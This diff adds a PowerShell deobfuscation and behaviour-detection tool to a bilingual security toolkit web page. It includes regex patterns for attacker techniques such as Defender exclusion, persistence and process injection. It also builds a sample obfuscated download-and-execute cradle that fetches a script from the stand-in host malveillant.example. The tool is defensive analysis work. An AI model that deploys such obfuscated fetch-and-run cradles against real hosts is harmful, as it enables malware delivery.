+    [/(?:Set|Add)-MpPreference|DisableRealtimeMonitoring|ExclusionPath/i, "Désactivation ou exclusion de Microsoft Defender", "Microsoft Defender disabled or excluded", "T1562.001"],
+    [/schtasks|Register-ScheduledTask|New-ScheduledTask/i, "Tâche planifiée (persistance)", "Scheduled task (persistence)", "T1053.005"],
+    [/CurrentVersion\\Run|\\RunOnce\b|Start Menu\\Programs\\Startup|shell:startup/i, "Clé Run ou dossier Démarrage (persistance)", "Run key or Startup folder (persistence)", "T1547.001"],
+    [/VirtualAlloc|CreateThread|WriteProcessMemory|CreateRemoteThread|NtCreateThreadEx/i, "Injection ou exécution de code en mémoire", "Process injection / in-memory execution", "T1055"],
+    [/Reflection\.Assembly\]::Load|Assembly\]::Load\(|\.Load\(\s*\[Convert\]/i, "Chargement réflexif d'un programme .NET", "Reflective .NET assembly loading", "T1620"],
+    [/ActiveXObject|WScript\.Shell|Shell\.Application|WScript\.CreateObject/i, "Exécution via Windows Script Host (JScript/VBScript)", "Execution via Windows Script Host (JScript/VBScript)", "T1059.007"],
+    [/Get-WmiObject|Win32_Process|Invoke-WmiMethod|\bwmic\s/i, "Utilisation de WMI", "WMI usage", "T1047"],
+    [/\b(?:whoami|systeminfo|ipconfig|nltest|Get-ComputerInfo)\b|\bnet\s{1,3}(?:user|group|localgroup)\b/i, "Reconnaissance du système", "System discovery", "T1082"],
+    [/\b(?:mshta|rundll32|regsvr32)(?:\.exe)?\b/i, "Binaire système détourné (LOLBin)", "System binary proxy execution (LOLBin)", "T1218"],
+    [/FromBase64String|\batob\s*\(|\[char\]|fromCharCode|-bxor|\s-e(?:nc|ncodedcommand|c)?\s+[A-Za-z0-9+\/]{20,}/i, "Obfuscation (encodage, codes de caractères…)", "Obfuscation (encoding, character codes…)", "T1027"]
+  ];
+
+  function initDeob() {
+    var input = $("#do-input"), status = $("#do-status"), results = $("#do-results");
+    var stepsEl = $("#do-steps"), output = $("#do-output"), behaviors = $("#do-behaviors");
+    var iocs = $("#do-iocs"), defang = $("#do-defang"), runBtn = $("#do-run");
+    var last = null;
+
+    function renderIocs() {
+      if (!last) return;
+      var n = renderIocGroups(iocs, last.all, defang.checked, true);
+      if (!n) iocs.innerHTML = '<p class="tool-hint">' + L("Aucun indicateur trouvé.", "No indicators found.") + "</p>";
+    }
+
+    function render(src, res) {
+      results.hidden = false;
+      stepsEl.innerHTML = "";
+      res.steps.forEach(function (s, i) {
+        var li = document.createElement("li");
+        var head = document.createElement("span");
+        head.innerHTML = L(esc(s.fr), esc(s.en)) + (s.n > 1 ? " <small class=\"tool-muted\">×" + s.n + "</small>" : "");
+        li.appendChild(head);
+        var det = document.createElement("details");
+        var sum = document.createElement("summary");
+        sum.innerHTML = L("voir le texte après l'étape " + (i + 1), "show text after step " + (i + 1));
+        var pre = document.createElement("pre");
+        pre.className = "tool-output";
+        pre.textContent = s.text.length > 20000 ? s.text.slice(0, 20000) + "\n…" : s.text;
+        det.appendChild(sum);
+        det.appendChild(pre);
+        li.appendChild(det);
+        stepsEl.appendChild(li);
+      });
+      if (!res.steps.length) {
+        stepsEl.innerHTML = "<li>" + L("Aucune couche d'obfuscation reconnue.", "No known obfuscation layer found.") + "</li>";
+      }
+      output.textContent = res.text;
+
+      // comportements et IOC : sur l'entrée ET toutes les couches intermédiaires
+      var layers = [src].concat(res.steps.map(function (s) { return s.text; }));
+      var all = layers.join("\n");
+      if (all.length > DEOB_MAX_OUTPUT) all = all.slice(0, DEOB_MAX_OUTPUT);
+      last = { all: all };
+      behaviors.innerHTML = "";
+      BEHAVIORS.forEach(function (b) {
+        if (!b[0].test(all)) return;
+        var li = document.createElement("li");
+        var a = document.createElement("a");
+        a.href = "https://attack.mitre.org/techniques/" + b[3].replace(".", "/") + "/";
+        a.textContent = b[3];
+        a.className = "deob-technique";
+        a.rel = "noopener";
+        a.target = "_blank";
+        li.appendChild(a);
+        var span = document.createElement("span");
+        span.innerHTML = " " + L(esc(b[1]), esc(b[2]));
+        li.appendChild(span);
+        behaviors.appendChild(li);
+      });
+      if (!behaviors.children.length) {
+        behaviors.innerHTML = "<li>" + L("Aucun comportement typique repéré.", "No typical behaviour spotted.") + "</li>";
+      }
+      renderIocs();
+
+      var k = res.steps.length;
+      if (res.capped) msg(status, "warn", L("Arrêt après " + k + " étapes (limite de sécurité).", "Stopped after " + k + " steps (safety limit)."));
+      else if (k) msg(status, "ok", L(k + " couche(s) retirée(s). Le script n'a pas été exécuté.", k + " layer(s) removed. The script was not executed."));
+      else msg(status, "warn", L("Aucune couche reconnue : le script est peut-être déjà en clair, ou utilise une obfuscation non gérée.", "No known layer: the script may already be in clear, or use unsupported obfuscation."));
+    }
+
+    function run() {
+      var src = input.value;
+      if (!src.trim()) { msg(status, "", ""); results.hidden = true; return; }
+      if (src.length > DEOB_MAX_INPUT) {
+        msg(status, "bad", L("Texte trop long (2 Mo maximum).", "Text too long (2 MB max)."));
+        return;
+      }
+      runBtn.disabled = true;
+      msg(status, "", L("Analyse en cours…", "Analysing…"));
+      deobfuscate(src).then(function (res) { render(src, res); }, function (err) {
+        msg(status, "bad", err && err.message === "bomb"
+          ? L("Arrêt : le contenu décodé dépasse 8 Mo (possible bombe de décompression).", "Stopped: decoded content exceeds 8 MB (possible decompression bomb).")
+          : L("Erreur pendant l'analyse.", "Error during analysis."));
+      }).then(function () { runBtn.disabled = false; });
+    }
+
+    // Exemple inoffensif à trois couches : -EncodedCommand → Base64 compressé → script masqué.
+    // Le domaine malveillant.example est réservé (RFC 2606) : il n'existe pas.
+    function sample() {
+      var inner = [
+        "$u = 'ht'+'tp'+'://malveillant'+'.example/charge.ps1'",
+        "$w = New-Object (\"{1}{0}\" -f 'bClient','Net.We')",
+        "$s = $w.('Down'+'load'+'String').Invoke($u)",
+        "I`E`X $s",
+        "Write-Host ([char]66+[char]111+[char]110+[char]106+[char]111+[char]117+[char]114)"
+      ].join("\n");
+      if (typeof CompressionStream === "undefined") return Promise.resolve(inner);
+      var cs = new CompressionStream("deflate-raw"), w = cs.writable.getWriter();
+      w.write(enc.encode(inner));
+      w.close();
+      return new Response(cs.readable).arrayBuffer().then(function (buf) {
+        var mid = "$d = New-Object IO.Compression.DeflateStream([IO.MemoryStream][Convert]::FromBase64String('" +
+          b64encode(new Uint8Array(buf)) + "'), [IO.Compression.CompressionMode]::Decompress)\n" +
+          "IEX (New-Object IO.StreamReader($d)).ReadToEnd()";
+        var u16 = new Uint8Array(mid.length * 2);
+        for (var i = 0; i < mid.length; i++) { u16[2 * i] = mid.charCodeAt(i) & 0xff; u16[2 * i + 1] = mid.charCodeAt(i) >> 8; }
+        return "powershell.exe -NoP -W Hidden -Enc " + b64encode(u16);
+      });
+    }
+
+    runBtn.addEventListener("click", run);
+    defang.addEventListener("change", renderIocs);
+    $("#do-sample").addEventListener("click", function () {
+      sample().then(function (s) { input.value = s; run(); });
+    });
+    $("#do-copy").appendChild(makeCopy(function () { return output.textContent; }));
+  }
+
   /* ---------- Démarrage ---------- */
-  var INIT = { generator: initGenerator, checker: initChecker, hash: initHash, encoder: initEncoder, jwt: initJwt, ioc: initIoc };
+  var INIT = { generator: initGenerator, checker: initChecker, hash: initHash, encoder: initEncoder, jwt: initJwt, ioc: initIoc, deob: initDeob };
   function start() {
     applyPlaceholders();
     var main = document.querySelector("main[data-tool]");
